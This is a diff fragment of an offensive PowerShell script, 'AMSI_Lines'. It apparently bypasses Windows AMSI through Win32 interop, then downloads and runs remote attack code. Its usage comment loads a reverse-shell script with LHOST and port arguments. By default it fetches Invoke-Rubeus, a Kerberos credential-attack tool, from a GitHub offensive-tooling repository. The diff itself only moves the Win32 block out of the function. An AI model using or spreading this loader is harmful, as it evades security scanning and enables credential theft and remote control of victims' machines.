@@ -10,14 +10,7 @@
      AMSI_Lines -File http://127.0.0.1:8080/revshell.ps1 -Commands "-LHOST MyIp -Port 9001"
      AMSI_Lines # This Will Execute Invoke-Rubeus By default with '-h' parameter
 #>
-function AMSI_Lines() { 
-    Param (
-           
-        [String]$File = "https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1",
-        [String]$Commands = 'invoke-rubeus -command "-h"'
-    )
-       
-    $Win32 = @"
+ $Win32 = @"
 using System;
 using System.Runtime.InteropServices;
 public class Win32 {
@@ -31,6 +24,15 @@ public class Win32 {
 "@
 
     Add-Type $Win32
+    
+function AMSI_Lines() { 
+    Param (
+           
+        [String]$File = "https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1",
+        [String]$Commands = 'invoke-rubeus -command "-h"'
+    )
+       
+   
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
